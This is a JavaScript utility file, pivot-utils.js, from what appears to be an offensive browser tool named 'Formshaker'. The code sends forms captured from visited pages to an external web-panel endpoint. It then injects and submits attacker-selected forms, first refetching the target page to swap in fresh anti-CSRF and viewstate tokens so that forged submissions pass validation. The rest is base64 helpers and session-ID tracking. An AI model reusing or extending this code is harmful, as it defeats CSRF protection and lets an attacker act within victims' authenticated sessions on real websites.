
    //------------------------[+] pivot-utils.js [+]-----------------------------------

    /**------- UPDATE HIDDEN INPUT TYPES FUNCTIONS ----------
    * This is for those cases where there are some inputs related with the session such as antiCSRF o viewstate(no tested)
    * The next functions basically try to update the hidden values by request the origin (url) of the target form before injecting it.
    * Thereby updating the invalid anticsrf tokens with a new/valid one from the same form.
    *
    * fetchFreshHiddenInputs_and_UpdateValues_and_InjectForms
    * This function is part of the technique and can be found in pivot-utils.ajax.js and pivot-utils.iframe.js as they have different implementations
    */

    function isThereHiddenTypeInputsInPayload(payload) {
        for (input of payload.inputs) {
            if (input.Type == "hidden")
                return true
        }
        return false
    }

    /**
    * Function is the starting point where the injection/submittion of a form happens. This determines whether the payload has to be updated or not before injecting it.
    * @param    {List} payloads    A list of objects, the objects are the forms that has been selected to be injected/submitted.
    */
    function ProxyPayloads(payloads) {
        payloads = JSON.parse(payloads)
        if (payloads.length == 0)
            return

        for (payload of payloads) {
            var elapsed_minutes = getElapsedMinutes(payload.time);
            if (debug)
                console.log("Elapsed minutes between the form/payload to be injected and this moment: " + elapsed_minutes)

            // elapsed_minutes is the estimated time that the session takes before it expires. 
            // If more than 10 minutes have passed between the form being obtained and injected, 
            // then the hidden inputs will be refreshed before injecting the form, inputs such as those containing the antiCSRF tokens. 
            // The hidden type inputs are updated when the elapsed time between selecting a form to inject (webpanel) and the moment when it is finally injected is shorter than 10 minutes.
            if (isThereHiddenTypeInputsInPayload(payload) && elapsed_minutes > 10) {
                console.log("Updating hidden parameters...")
                fetchFreshHiddenInputs_and_UpdateValues_and_InjectForms(payload)

            } else {
                if (debug)
                    console.log("[*] CreateTwoPayloadsFromOne_and_InjectThem without updating the hidden type inputs")
                CreateTwoPayloadsFromOne_and_InjectThem(payload)

            }
        }
    }

    /**
    * Function that checks the elapsed time between the detection of a form and the injection of it.
    * @param    {String} time       URL encoded time when the form was found.
    * @return   {Integer}           The elapsed time in minutes.
    */
    function getElapsedMinutes(time) {
        var diff = Math.abs(new Date(decodeURIComponent(time)) - new Date());
        var minutes = Math.floor((diff / 1000) / 60);
        return minutes
    }

    /**
    * Function that parses the hidden inputs within the form.
    * @param    {String} html                   Source code of the visited page.
    * @param    {Integer} formNumberInPage      The number that identifies the target form.
    * @return   {Object}                        An object with the hidden inputs
    */
    function getHiddenInputsByForm(html, formNumberInPage) {
        hidden_inputs = {}
        parsedDocument = new DOMParser().parseFromString(html, "text/html");
        form = parsedDocument.forms[formNumberInPage]

        for (input of form.elements) {
            if (input.type == "hidden" && !input.modified)
                hidden_inputs[input.name] = input.value
        }

        return hidden_inputs

    }


    // this update the new hidden inputs from the payload (form to inject) with the fresh values.
    /**
    * Function that updates the hidden inputs from the payload (form to inject) by using the new and valid input values obtained recently .
    * @param    {Object} payload            The form to be injected
    * @param    {Object} hidden_inputs      An object with the hidden inputs found for this form.
    * @return   {Object}                    The payload with the updates inputs.
    */
    function updateFormHiddenInputs(payload, hidden_inputs) {
        if (debug)
            console.log("Payload - Before: " + payload.inputs[0].name + " : " + payload.inputs[0].value)

        for (input of payload.inputs) {
            if (input.Type == "hidden")
                input.value = hidden_inputs[input.name]
        }
        if (debug)
            console.log("Payload - After: " + payload.inputs[0].name + " : " + payload.inputs[0].value)

        return payload
    }

    /**------- END> UPDATE HIDDEN INPUT TYPES FUNCTIONS ---------- */


    /**
    * Function that gets and sets the SessionID to identify the user.
    * @return   {Integer}         Session ID
    */
    function createSessionID() {
        sessionID = localStorage.getItem('sessionID');
        if (sessionID == null) {
            sID = "Formshaker-" + Math.floor(Math.random() * (10000 - 0) + 0);
            localStorage.setItem('sessionID', sID);
            sessionID = sID;
        }
        return sessionID;
    }


    /**
    * Function that gets and sets the ExecutionID to keep track of number of executions.
    * @return   {Integer}         Execution ID
    */
    function getExecutionID() {

        var executionID = localStorage.getItem('executionID');
        if (executionID == null) {
            var sID = 0;
            localStorage.setItem('executionID', sID);
            executionID = sID;
        } else {
            var newSID = parseInt(executionID) + 1;
            localStorage.setItem('executionID', newSID);
            executionID = newSID;
        }
        return executionID;
    }

    function b64ToUint6(nChr) {
        return nChr > 64 && nChr < 91 ?
            nChr - 65
            : nChr > 96 && nChr < 123 ?
                nChr - 71
                : nChr > 47 && nChr < 58 ?
                    nChr + 4
                    : nChr === 43 ?
                        62
                        : nChr === 47 ?
                            63
                            :
                            0;
    }

    function base64DecToArr(sBase64, nBlocksSize) {

        var
            sB64Enc = sBase64.replace(/[^A-Za-z0-9\+\/]/g, ""), nInLen = sB64Enc.length,
            nOutLen = nBlocksSize ? Math.ceil((nInLen * 3 + 1 >> 2) / nBlocksSize) * nBlocksSize : nInLen * 3 + 1 >> 2, taBytes = new Uint8Array(nOutLen);

        for (var nMod3, nMod4, nUint24 = 0, nOutIdx = 0, nInIdx = 0; nInIdx < nInLen; nInIdx++) {
            nMod4 = nInIdx & 3;
            nUint24 |= b64ToUint6(sB64Enc.charCodeAt(nInIdx)) << 18 - 6 * nMod4;
            if (nMod4 === 3 || nInLen - nInIdx === 1) {
                for (nMod3 = 0; nMod3 < 3 && nOutIdx < nOutLen; nMod3++, nOutIdx++) {
                    taBytes[nOutIdx] = nUint24 >>> (16 >>> nMod3 & 24) & 255;
                }
                nUint24 = 0;

            }
        }

        return taBytes;
    }


    function _base64ToArrayBuffer(base64) {
        var binary_string = window.atob(base64);
        var len = binary_string.length;
        var bytes = new Uint8Array(len);
        for (var i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes.buffer;
    }

    var App = {};
    App.notify = function (type, message) {
        if (debug)
            console.log(type + '! ' + message);
    };
    /*
    App.getErrorMessage = function (jqxhr, exception) {
        if (jqxhr.status === 0) {
            return 'Can not connect to server. Please check your network connection';
        } else if (jqxhr.status == 404) {
            return 'Requested page not found. Error - 404';
        } else if (jqxhr.status == 401) {
            return 'Not authorized!';
        } else if (exception === 'parsererror') {
            return 'Requested JSON parse failed.';
        } else if (exception === 'timeout') {
            return 'Request Time out error.';
        } else if (exception === 'abort') {
            return 'Request aborted.';
        } else {
            return 'Uncaught Error.n' + jqxhr.responseText;
        }
    };*/
    App.getErrorMessage = function (response) {
        return "HTTP status code: " + response.status
    };

    var sendTime = false;
    /**
    * Function that sends the original forms to the web panel
    * @param    {String} form    a serialized form including its inputs
    */
    function sendForms(form) {
        var task = "";
        postParameters = form

        var xhr = new XMLHttpRequest();
        xhr.open("POST", endpoint);
        xhr.setRequestHeader("XX-Origin", "Formshaker");
        xhr.timeout = 4000;
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.ontimeout = function () {
            App.notify('timeout', 'Formshaker webpage timeout');
        };
        xhr.onreadystatechange = function () {
            if (xhr.readyState == XMLHttpRequest.HEADERS_RECEIVED) {
                App.notify('success', 'Formshaker successfully connected!');
            }
        }
        xhr.send(postParameters);

    }

    //-----------------------------------------------------------